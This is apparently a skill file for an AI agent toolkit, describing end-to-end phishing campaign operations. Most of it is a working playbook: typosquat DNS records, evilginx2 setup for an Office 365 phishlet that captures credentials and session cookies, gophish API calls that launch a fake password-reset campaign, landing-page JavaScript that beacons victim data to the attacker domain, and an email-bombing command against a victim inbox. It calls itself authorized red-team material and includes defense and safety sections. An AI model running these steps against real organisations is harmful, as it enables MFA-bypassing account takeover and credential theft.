---
name: email-security-deep
description: Phishing infrastructure and email gateway bypass covering AiTM MFA interception (evilginx2/modlishka/evilgophish), campaign platforms (gophish/King-Phisher), enterprise gateway evasion (Proofpoint/Mimecast/Cisco ESA/Microsoft Defender for Office), email bombing/DoS, sender reputation engineering, and full-stack campaign operations including landing pages, payload staging, and post-click telemetry — complementary to email-protocol-attack which handles protocol-level forgery.
origin: github-trending-2026
version: 0.1.31
compatibility: ">=0.1.31"
allowed-tools:
  - Bash
  - Read
  - Write
  - Edit
  - Glob
  - Grep
  - WebFetch
metadata:
  domain: appsec
  tool_count: 14
  guide_count: 1
  mitre: "T1566-Phishing (Spearfish, Service Spearfish, Spearfish Attachment), T1114-Email Collection, T1059-Automated Command Execution via payload"
---



# Skill: Email Security Deep — Phishing Infrastructure & Gateway Bypass

> **Supplementary Files**:
> - `payloads.md` — 14 sections: evilginx2 phishlet authoring + AiTM proxy, evilgophish integration, modlishka flexible reverse-proxy, gophish campaign platform + API, King-Phisher alternative platform, gateway evasion (Proofpoint URL Defense / Mimecast / Cisco ESA / Microsoft Defender Safe Links & Safe Attachments), sender reputation engineering (BIMI/ARC/MX), email bombing/DoS, landing-page + payload staging (HTML smuggling, decrypted-on-click), post-click telemetry & beacon design, FIDO2/hardware-key detection and pivot logic, real-world AiTM campaigns (CozyCar / EvilProxy / NakedTenant)
> - `test-cases.md` — 12 structured test cases (TC-ED-001 through TC-ED-012) covering infrastructure stand-up, AiTM capture, gateway evasion, reputation warm-up, payload delivery, telemetry, and FIDO2 pivot
> - `guides/email-security-deep-playbook.md` — end-to-end playbook from pretext design through infrastructure build, gateway-evasion tuning, payload staging, AiTM session theft, and clean exit

## Summary

Email Security Deep covers the **campaign-operations layer** of email-based compromise: standing up phishing infrastructure (evilginx2, modlishka, evilgophish, gophish, King-Phisher), bypassing enterprise email gateways (Proofpoint, Mimecast, Cisco ESA, Microsoft Defender for Office), executing adversary-in-the-middle MFA bypass, running email-bomb flooding, and engineering sender reputation for spoofing success. This is the application/social-engineering layer above raw SMTP protocol abuse.

**Tools**: evilginx2, evilgophish, modlishka, gophish, King-Phisher, ThePhish, espoofer (chenjj), MailSpoof, SniperPhish, King-Phisher, mailspoof-check, swaks (for delivery probes), BombErAtom/Email-Bomber, beacon/C2 helper scripts, FIDO2-detection JS payload.

**Domain**: appsec (application / social layer, not network-protocol layer)

**MITRE ATT&CK**: T1566-Phishing (Spearfish, Service Spearfish, Spearfish Attachment), T1114-Email Collection, T1059-Automated Command Execution via payload

## Differentiation from `email-protocol-attack` (CRITICAL)

This skill is **complementary** to `skills/email-protocol-attack/`, not overlapping. Both deal with email, but at different abstraction layers.

| Dimension | `email-protocol-attack` (sibling) | `email-security-deep` (this skill) |
|-----------|-----------------------------------|-------------------------------------|
| **Abstraction layer** | Protocol — SMTP/IMAP/POP3/Exchange | Application — campaign platforms, gateways, browser/AiTM |
| **Primary goal** | Forge, enumerate, relay, compromise mailboxes | Run end-to-end phishing campaigns that bypass enterprise email defenses |
| **Mail auth focus** | SPF/DKIM/DMARC bypass at the protocol level (selector enumeration, `p=none` exploitation, header manipulation) | Sender reputation engineering for *spoofing success* — BIMI/ARC/MX hygiene, reputation warm-up, gateway-trust abuse |
| **MFA posture** | Not covered (assumes credential-only) | Central — AiTM reverse-proxy MFA token theft (evilginx2/modlishka), FIDO2 detection and pivot |
| **Sample tools** | `swaks`, `smtp-user-enum`, `smtpmap`, `nailgun`, `mutt`, `openssl` | `evilginx2`, `evilgophish`, `modlishka`, `gophish`, `King-Phisher`, `espoofer`, `MailSpoof`, `SniperPhish`, `BombErAtom` |
| **Gateway thinking** | "Will this mail server accept my forged mail?" | "Will Proofpoint/Mimecast/Cisco ESA/Microsoft Defender let this mail reach the inbox, and what URL/attachment rewriting must I defeat?" |
| **Output** | Forged email delivered, mailbox access | Captured credential + session cookie (bypassing MFA), campaign telemetry report |

**Rule of thumb**: if the question is *"can I make this mail server accept a forged message?"* → `email-protocol-attack`. If the question is *"can I run a campaign that lands in the inbox AND captures MFA tokens via AiTM?"* → this skill. They chain together — protocol-level forgery feeds campaign delivery — but the *focus* differs.

**Also distinct from `social-engineering`**: that skill covers the *human-psychology* layer (pretext design, vishing, tailgating, USB baiting). This skill is the *infrastructure* layer: how to actually stand up the phishing platform, route mail past gateways, and capture sessions. Real engagements use both.

## Use Cases

1. **Authorized red-team phishing campaign** — Stand up a full gophish + evilginx2 stack to test an organization's email gateway, EDR, and user-click response rate, with MFA bypass via AiTM where in-scope.
2. **Email gateway bypass assessment** — Deliver a benign payload past Proofpoint URL Defense, Mimecast URL expansion, Cisco ESA sandboxing, and Microsoft Defender Safe Links/Attachments to validate gateway efficacy.
3. **AiTM MFA-bypass simulation** — Reproduce EvilProxy / NakedTenant style attacks where session cookies are stolen mid-login via evilginx2 reverse proxy, defeating TOTP/SMS/push MFA.
4. **Sender reputation / spoofing success audit** — Audit a client's SPF/DKIM/DMARC/BIMI/ARC posture from the *attacker's* perspective — what sender identities will the gateway trust, and which can be spoofed.
5. **Email bombing / DoS test** — Flood a target's mailbox (with authorization) to measure notification fatigue, gateway rate-limiting, and downstream incident-response behavior.
6. **Phishing landing page + payload staging review** — Review HTML-smuggling, decrypted-on-click attachments, and C2 callback patterns used by active threat groups.
7. **FIDO2 / hardware-key resistance test** — Detect when a target uses FIDO2 (evilginx2 cannot capture it) and pivot to a different vector (device-code flow, OAuth consent phishing) instead of wasting campaign budget.
8. **Post-click telemetry & campaign measurement** — Instrument open/click tracking, beacon design, and C2 callback patterns to produce a metrics report (delivery rate, click rate, credential-capture rate, MFA-bypass rate).
9. **Real-world AiTM campaign reproduction** — Reproduce the CozyCar / EvilProxy / NakedTenant kill chain in a lab to validate detection rules and user-training efficacy.
10. **Clean-exit / OPSEC review** — After a campaign, ensure no orphaned infrastructure, no leaked credentials in logs, and that all captured session cookies have been lawfully destroyed per engagement scope.

## Core Tools

| Tool | Purpose | Command Example |
|------|---------|-----------------|
| **evilginx2** | AiTM reverse-proxy phishing — captures credentials + session cookies, bypassing MFA | `sudo ./evilginx -p phishlets -d` |
| **evilgophish** | Combines evilginx2 + gophish for combined AiTM + campaign management | `./evilgophish.sh` |
| **modlishka** | Flexible reverse-proxy with JS template injection for AiTM | `./modlishka -proxyAddress 0.0.0.0` |
| **gophish** | Open-source phishing campaign platform (8k+ stars) — templates, sending profiles, landing pages, tracking | `./gophish` (web UI on :3333) |
| **King-Phisher** | GTK-based phishing campaign management + awareness training | `king-phisher` GUI + server |
| **ThePhish** | AI-assisted phishing classification & response (1.3k stars) — useful for defense-simulation | `python3 -m thephish` |
| **espoofer** (chenjj) | SPF/DKIM/DMARC bypass verification (1.7k stars) — verifies spoofing success | `sudo python3 espoofer.py -i test_email.txt` |
| **MailSpoof** | Scripted SPF/DMARC bypass testing for sender reputation audit | `python3 mailspoof.py -d target.com` |
| **SniperPhish** | Cloud-aware phishing toolkit for O365 / Gmail targets | `python3 sniperphish.py` |
| **BombErAtom / Email-Bomber** | Targeted email flooding / DoS for notification-fatigue testing | `python3 email_bomber.py` (with authorization) |
| **mailspoof-check / checkdmarc** | Audit SPF/DKIM/DMARC/BIMI/ARC/MX posture | `checkdmarc target.com` |
| **swaks** (delivery probe) | SMTP injection probe for gateway-bypass testing — used here as a *delivery probe*, not for protocol abuse | `swaks --to victim@target.com --body @payload.txt` |
| **FIDO2-detection JS payload** | Browser-side script to detect `PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable()` and signal C2 to pivot | Inline JS in landing page |
| **Beacon / C2 helper scripts** | Post-click callback, session-cookie exfil, and campaign telemetry aggregation | Custom (see `payloads.md` Section 13) |

## Methodology

### Six-Phase Campaign Operations Workflow

```
Phase 1           Phase 2           Phase 3           Phase 4           Phase 5           Phase 6
Pretext &         Infrastructure    Gateway           Payload           AiTM /            Exfil & Exit
Target Profiling  Stand-up          Evasion Tuning    Delivery          Click-Time        (Clean Exit)
     │                 │                 │                 │                 │                 │
     ▼                 ▼                 ▼                 ▼                 ▼                 ▼
OSINT target       gophish +         Proofpoint URL    HTML smuggling,   evilginx2 phishlet Session cookie
list, pretext      evilginx2 on      Defense bypass,   decrypted-on-     served on look-   rotation, telemetry
narrative,         VPS, domain       Mimecast auth     click attachment,  alike domain,     report, evidence
landing copy       registration,     posture,          gateway-trusted    MFA token live    destruction, infra
                   TLS, redirectors  Defender Safe     sender identity,   capture,          teardown
                                     Links / Safe      landing-page      FIDO2 detection   ──────────────
                                     Attachments       staging           & pivot
```

**Phase 1: Pretext & Target Profiling** — Build the campaign narrative. Use OSINT (LinkedIn, theHarvester, recon-ng — see `skills/osint/`, `skills/social-engineering/`) to enumerate recipients, then craft a pretext (IT password reset, package delivery, executive urgent directive, shared-doc notification). Define the desired post-click action (credential submit, MFA approval, payload execute).

**Phase 2: Infrastructure Stand-up** — Register look-alike domains (`micros0ft-login.com`, `paypa1-verify.com`), obtain TLS certs (Let's Encrypt or pre-staged wildcards), configure DNS (A, MX, SPF, DKIM, DMARC for the *spoofed* identity if reputation-tolerant), and deploy gophish + evilginx2 on a hardened VPS with redirectors to mask the true origin IP.

**Phase 3: Gateway Evasion Tuning** — Pre-flight each gateway the target uses. Proofpoint rewrites URLs (`urldefense.proofpoint.com/v2/url?u=...`) — test that your landing domain survives rewriting and that the un-rewritten click-through works. Mimecast expands URLs at click time and may sandbox. Cisco ESA runs attachment sandboxing. Microsoft Defender Safe Links rewrites and Safe Attachments detonates. Tune sender reputation (DKIM-signed, SPF-aligned, DMARC-aligned, BIMI if applicable, warmed-up IP) until deliverability is acceptable.

**Phase 4: Payload Delivery** — Send the campaign via gophish (or evilgophish combined stack). For payloads, prefer HTML smuggling (the attachment contains JS that reconstructs the malicious binary client-side — gateway sees only benign HTML/JS) and decrypted-on-click attachments (encrypted zip that the gateway cannot unzip without the password). Track opens (1x1 beacon) and clicks (redirect link).

**Phase 5: AiTM / Click-Time** — When a victim clicks through to the AiTM landing page, evilginx2 proxies the login to the real service, captures the credential, captures the MFA token (live, as the victim completes MFA), and — critically — captures the **session cookie** that authenticates the victim post-MFA. The attacker then imports the session cookie into their own browser and is now logged in as the victim, having "passed" MFA without ever needing to phish the MFA secret itself.

If the target uses FIDO2 (`isUserVerifyingPlatformAuthenticatorAvailable()` returns true and the visible MFA prompt is a security key, not a TOTP/push), AiTM will fail — detect this in-browser and pivot to device-code flow, OAuth consent phishing, or a different target. Document this in the report as a control strength.

**Phase 6: Exfil & Exit** — Aggregate captured sessions, rotate session cookies into a separate browser profile, perform authorized post-exploitation (per engagement scope), then tear down infrastructure: destroy captured credentials/cookies per the engagement scope, delete gophish database, revoke DNS, retire VPS, and produce the campaign telemetry report (delivery rate, open rate, click rate, credential-capture rate, MFA-bypass rate, FIDO2-blocked count).

### Quick Selection Guide

| Scenario | Primary Approach | Alternative |
|----------|------------------|-------------|
| MFA-protected O365 tenant | evilginx2 AiTM phishlet for `office365` | modlishka with O365 template |
| Need campaign dashboard + email templating | gophish + custom landing | evilgophish (combined) |
| Need to prove gateway bypass works | swaks delivery probe + gateway-evasion sender setup | MailSpoof automated bypass test |
| MFA-bypass fails (FIDO2) | Detect & pivot to device-code phishing | OAuth consent phishing |
| Need bulk email flooding (DoS) | BombErAtom with rate-limited threads | Custom Python threaded SMTP |
| Need to verify spoofing success | espoofer against client's mail infra | MailSpoof + manual swaks |
| Need landing-page payload staging | HTML smuggling with client-side reconstruction | Encrypted-zip with password in separate channel |
| Need post-click telemetry | gophish built-in tracking + custom beacons | Custom C2 callback aggregator |
| Need to warm up sender reputation | Gradual ramp on dedicated IP w/ BIMI | Use established 3rd-party ESP (Mailgun/SendGrid) |
| Need clean exit | Evidence destruction per SoW, infra teardown | Takedown service (e.g., Netcraft) |

## Practical Steps

> Detailed payloads in `payloads.md`, complete test checklist in `test-cases.md`. Below is a summary of the six-phase workflow with representative commands.

### Step 1: Infrastructure Stand-up

```bash
# Register look-alike domain (use authorized registrar only)
# Configure DNS for both spoofing identity and landing page host
# A record for landing host
echo "login.micros0ft-secure.com.   IN  A   198.51.100.10" >> zone.txt
# MX record (for replies if engagement wants reply capture)
echo "micros0ft-secure.com.         IN  MX  10 mail.micros0ft-secure.com." >> zone.txt
# SPF aligned with sending IP
echo 'micros0ft-secure.com.         IN  TXT "v=spf1 ip4:198.51.100.10 -all"' >> zone.txt
# DMARC aligned with SPF
echo '_dmarc.micros0ft-secure.com. IN  TXT "v=DMARC1; p=none; rua=mailto:postmaster@micros0ft-secure.com"' >> zone.txt

# Launch evilginx2 (AiTM reverse proxy)
sudo ./evilginx -p phishlets
# Inside evilginx CLI:
#   config domain micros0ft-secure.com
#   config ip 198.51.100.10
#   phishlets hostname office365 login.micros0ft-secure.com
#   phishlets enable office365
#   lures create office365
#   lures get-url 0

# Launch gophish on the same VPS (or separate)
./gophish  # web UI on https://127.0.0.1:3333
# Default creds admin / gophish (CHANGE FIRST)
```

### Step 2: Gateway Evasion Pre-Flight

```bash
# Check client's gateway by sending a probe mail and inspecting received headers
swaks --to probe@target.com --from test@micros0ft-secure.com \
  --server mail.target.com --header "Subject: probe" --body "open me"

# Inspect received headers on the target side
# Look for: X-Proofpoint-Spam-Details, X-Mimecast-, X-IronPort- (Cisco ESA),
#           X-MS-Exchange-Organization- (Defender for Office)

# Verify sender reputation from attacker's side
checkdmarc target.com         # victim's posture
python3 espoofer.py -i test_email.txt --spoof micros0ft-secure.com

# Warm up sender IP gradually (volume ramp over 7 days)
# Day 1-3: low volume to internal test addresses
# Day 4-7: ramp to half campaign volume
# Day 8+: full campaign
```

### Step 3: gophish Campaign Build (API)

```bash
# Create sending profile (SMTP relay)
curl -k -X POST https://localhost:3333/api/smtp/ \
  -H "Authorization: Bearer $GOPHISH_API_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "microsoft-relay",
    "host": "mail.micros0ft-secure.com:587",
    "from_address": "Microsoft Security <noreply@micros0ft-secure.com>",
    "username": "sender",
    "password": "staged-cred",
    "headers": {"X-Priority": "1"}
  }'

# Create landing page (redirect to evilginx2 lure URL)
curl -k -X POST https://localhost:3333/api/pages/ \
  -H "Authorization: Bearer $GOPHISH_API_KEY" \
  -d '{
    "name": "office365-login",
    "html": "<html><head><meta http-equiv=\"refresh\" content=\"0; url={{.URL}}\"></head></html>",
    "redirect_url": "https://login.micros0ft-secure.com/lure/0"
  }'

# Create email template
curl -k -X POST https://localhost:3333/api/templates/ \
  -H "Authorization: Bearer $GOPHISH_API_KEY" \
  -d '{
    "name": "urgent-password-reset",
    "subject": "Action Required: Password Expiry in 24h",
    "html": "<html><body>...click <a href=\"{{.URL}}\">here</a>...</body></html>"
  }'

# Launch campaign
curl -k -X POST https://localhost:3333/api/campaigns/ \
  -H "Authorization: Bearer $GOPHISH_API_KEY" \
  -d '{
    "name": "Q2-redteam-001",
    "template": {"name": "urgent-password-reset"},
    "page": {"name": "office365-login"},
    "smtp": {"name": "microsoft-relay"},
    "groups": [{"name": "engineering-team"}]
  }'
```

### Step 4: evilginx2 AiTM Phishlet Authoring (excerpt)

```yaml
# phishlets/office365.yaml — simplified excerpt, see payloads.md for full
author: 'kali-claw'
min_ver: '2.3.0'
proxy_hosts:
  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
  - {phish_sub: 'www',   orig_sub: 'www',   domain: 'office.com',         session: true, is_landing: false}
auth_tokens:
  - domain: '.login.microsoftonline.com'
    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie']
  - domain: '.office.com'
    keys: ['rt', 'rt_Fédérated', 'MSPAuth', 'MSAuth1']
credentials:
  username:
    key: 'login'
    search: '(.*)'
    type: 'post'
  password:
    key: 'passwd'
    search: '(.*)'
    type: 'post'
login:
  domain: 'login.microsoftonline.com'
  path: '/'
```

### Step 5: FIDO2 Detection (browser-side JS)

```javascript
// Inject this on the AiTM landing page BEFORE the credential capture completes
async function detectFIDO2() {
  if (!window.PublicKeyCredential) return { fido2: false, reason: 'unsupported' };
  const uvpa = await PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable();
  if (uvpa) {
    // Target likely uses FIDO2 — AiTM will fail to capture session
    // Signal C2 to log this victim and skip session-import attempt
    fetch('https://login.micros0ft-secure.com/beacon/fido2', {
      method: 'POST',
      body: JSON.stringify({victim_id: window.__victim_id__, fido2: true})
    });
  }
  return { fido2: uvpa };
}
detectFIDO2();
```

### Step 6: Email Bombing (DoS — authorized only)

```bash
# BombErAtom — target single inbox for notification-fatigue test
python3 email_bomber.py \
  --target victim@target.com \
  --count 200 \
  --threads 8 \
  --delay 2 \
  --provider gmail   # uses Gmail's own SMTP (test mode)

# Detection (defense side):
# Aggregate inbound to victim mailbox per minute
# Alert if > 50 messages/min from diverse senders
```

## Defense Perspective

| Defense Measure | Description | Priority |
|-----------------|-------------|----------|
| **FIDO2 / hardware security keys** | Phishing-resistant — evilginx2/modlishka cannot capture the WebAuthn assertion bound to the legitimate origin. Single strongest control. | CRITICAL |
| **Conditional Access — compliant device required** | Even with stolen session cookie, attacker cannot use it from a non-compliant / non-managed device. Drops AiTM effectiveness sharply. | CRITICAL |
| **Conditional Access — token binding / continuous access evaluation (CAE)** | Binds session to device fingerprint; AiTM-captured cookie fails when replayed from a different device. | HIGH |
| **Email gateway URL rewriting + click-time reputation** | Proofpoint URL Defense, Mimecast URL expansion, Defender Safe Links — rewrites URLs at click time so a domain that "looked clean" at delivery is re-checked against fresh threat intel. Defeats benign-at-delivery / malicious-at-click. | CRITICAL |
| **Safe Attachments / sandbox detonation** | Microsoft Defender Safe Attachments, Cisco ESA sandbox — detonates attachments in VM before delivery. Defeats most macro and executable payloads; pairs with HTML-smuggling defense (JS sandbox). | HIGH |
| **Strict DMARC (`p=reject`) + DKIM enforcement** | Stops spoofing at the gateway. Even sender-reputation-engineered attacks must use a look-alike domain (visible to user) rather than spoof the real one. | HIGH |
| **BIMI + ARC trust signals** | Brand Indicators for Message Identification (visible logo) trains users to expect a visible brand mark; absence becomes a tell. ARC preserves auth across forwarding. | MEDIUM |
| **User training — link inspection, FIDO2-first narrative** | Train users to inspect URLs (gateway rewriting makes this hard — supplement with "if it asks for password, verify out-of-band"). Roll out FIDO2 first for high-value accounts. | HIGH |
| **Anomalous-session detection** | UEBA / Azure AD Identity Protection — flag sessions from new geos, impossible travel, or non-compliant IP even when the cookie is "valid". | HIGH |
| **Email-bomb rate limiting** | Gateway-side per-recipient rate limit (e.g., max 10 msgs/min to single inbox from external senders); auto-quarantine floods. | MEDIUM |
| **Out-of-band verification for credential entry** | Any "reset password" / "verify login" flow that arrives via email should require a second channel (push to known device, callback to known number). | HIGH |

## Cross-References

- **`skills/email-protocol-attack/SKILL.md`** — Sibling skill. Protocol-level SMTP/IMAP/Exchange abuse (enumeration, forgery, SPF/DKIM/DMARC bypass at protocol level, mailbox compromise). This skill's Phase 2 (sender reputation) builds on `email-protocol-attack`'s protocol-level mail-auth bypass techniques; this skill does NOT re-cover protocol-level bypass — it covers *reputation-engineering for spoofing success* and *campaign-operations* on top.
- **`skills/social-engineering/SKILL.md`** — Adjacent skill. Covers the *human-psychology* layer (pretext design, vishing, USB baiting, OSINT profiling). This skill is the *infrastructure* layer that executes the pretext via email.
- **`skills/password-attack/SKILL.md`** — Credential attacks against captured credentials (hash cracking, password spraying) — relevant for post-campaign exploitation of harvested credentials.
- **`skills/web-auth-bypass/SKILL.md`** — Session and access-control abuse; relevant for understanding why session-cookie theft (via AiTM) is so damaging.
- **`skills/cloud-identity-attack/SKILL.md`** — O365 / Azure AD / Workspace identity attacks — AiTM-captured O365 sessions feed directly into this skill's cloud-identity post-exploitation.
- **`skills/payload-generation/SKILL.md`** — Payload craft for the attachment path (macros, shellcode, HTA) — this skill handles *delivery* (HTML smuggling, decrypted-on-click), `payload-generation` handles *what the payload does on execution*.
- **`skills/av-edr-evasion/SKILL.md`** — Evasion of endpoint defenses once the payload runs.
- **`skills/osint/SKILL.md`** & **`skills/recon-osint/SKILL.md`** — OSINT for recipient enumeration, the input to Phase 1 (pretext).
- **`skills/engagement-manager/SKILL.md`** — Scoping, authorization, rules of engagement for phishing campaigns (CRITICAL — phishing infra is high-risk, must be scoped in writing).

## Safety Notes

- **AUTHORIZATION IS NON-NEGOTIABLE**: Phishing infrastructure is high-risk. Stand up phishing campaigns, AiTM proxies, and email-bomb tools **ONLY** with a signed Statement of Work that explicitly names the target recipients, the sender identities you may use, the test window, and the data-handling requirements for captured credentials/sessions. Unscoped phishing is a crime in most jurisdictions (US CFAA, UK Computer Misuse Act, EU equivalents) and causes real harm.
- **Capture scope limits**: Captured credentials and session cookies are sensitive personal data. Per engagement scope, define: (a) what you may capture, (b) where you store it (encrypted at rest), (c) when you destroy it (typically at engagement close), (d) who may access it (named individuals only).
- **FIDO2 / phishing-resistant auth is the correct control**: When your campaign repeatedly fails against a target, that is *good* — the control is working. Document the failure as a control strength in the report; do not "find a way around" without explicit re-scoping.
- **Email bombing is a DoS**: Even with authorization, email bombing consumes victim inbox quota, can bounce legitimate mail, and can interfere with the victim's incident response. Use small volumes (e.g., 100-200 messages) only when the test objective is notification-fatigue measurement, not denial-of-service impact.
- **Real-world AiTM tooling (evilginx2, modlishka) is dual-use**: These tools are legitimately used by red teams and security researchers AND by criminal actors. Operating them leaves fingerprints (TLS cert, DNS history, infra IP) that may be flagged by threat intel — operate only from authorized infra and expect detection.
- **Look-alike domains**: Registering `micros0ft-secure.com` is typosquatting and may violate trademark law even with authorization. Where possible, use a clearly-fictional domain (`security-test.local`) plus an authorized subdomain of the client's own domain (`securitytest.client.com`) rather than typosquats.
- **Clean exit**: At engagement close, destroy captured credentials/cookies per SoW, tear down gophish database, revoke DNS records, retire the VPS, and produce a telemetry report. Leaving phishing infra running invites abuse by third parties.

## Hacker Laws

- **Trust but Verify** — Email headers and sender display names are forgeable. Gateway rewriting (Proofpoint URL Defense, Safe Links) can itself be a vector if the rewritten URL is manipulated. Verify the *true* destination of any link out-of-band.
- **Assume Breach** — When designing the client's defense, assume the attacker will get a credential. The question is whether they can convert it to a session (AiTM defeats MFA) and whether the session survives device-conditional-access (FIDO2 / CAE defeats AiTM).
- **Defense in Depth** — No single email control suffices. Layer gateway rewriting (click-time reputation) + sandbox detonation + strict DMARC + conditional access + FIDO2 + user training. The attacker has to defeat each layer.
- **Economy of Mechanism** — Simpler defenses are more reliable. FIDO2 (one primitive, phishing-resistant by design) beats complex multi-step MFA bypass detection.
- **Least Privilege — Recipient Minimization** — The fewer recipients in a campaign, the smaller the blast radius if a click occurs. Targeted spearphishing is more effective AND more containable than spray-and-pray.

## Learning Resources

- **This skill's supplementary files**: `payloads.md`, `test-cases.md`
- **Deep-dive guide**: `guides/email-security-deep-playbook.md` — end-to-end campaign operations playbook
- **Related skills**: see Cross-References above
- **External resources**:
  - evilginx2: [github.com/kgretzky/evilginx2](https://github.com/kgretzky/evilginx2)
  - evilgophish: [github.com/An0nUD4Y/evilgophish](https://github.com/An0nUD4Y/evilgophish)
  - modlishka: [github.com/drk1wi/modlishka](https://github.com/drk1wi/modlishka)
  - gophish: [getgophish.com](https://getgophish.com) / [github.com/gophish/gophish](https://github.com/gophish/gophish)
  - King-Phisher: [github.com/rsmusllp/king-phisher](https://github.com/rsmusllp/king-phisher)
  - ThePhish: [github.com/emalderson/ThePhish](https://github.com/emalderson/ThePhish)
  - espoofer: [github.com/chenjj/espoofer](https://github.com/chenjj/espoofer)
  - CISA AiTM guidance: [cisa.gov/security-advisories](https://www.cisa.gov/news-events/cybersecurity-advisories) (search: adversary-in-the-middle)
  - Microsoft AiTM research: [Microsoft Security Blog](https://www.microsoft.com/en-us/security/blog) (search: AiTM, evilginx, session theft)
  - Proofpoint URL Defense docs: [proofpoint.com](https://www.proofpoint.com)
  - Mimecast URL expansion: [mimecast.com](https://www.mimecast.com)
  - Cisco ESA: [cisco.com/c/en/us/support/security/email-security-appliance](https://www.cisco.com/c/en/us/support/security/email-security-appliance.html)
  - Microsoft Defender for Office: [learn.microsoft.com/defender](https://learn.microsoft.com/en-us/microsoft-365/security/office-365-security/)
  - FIDO Alliance WebAuthn guidance: [fidoalliance.org](https://fidoalliance.org/fido2/)
  - **Core system files**: `SOUL.md`, `TOOLS.md`, `IDENTITY.md`
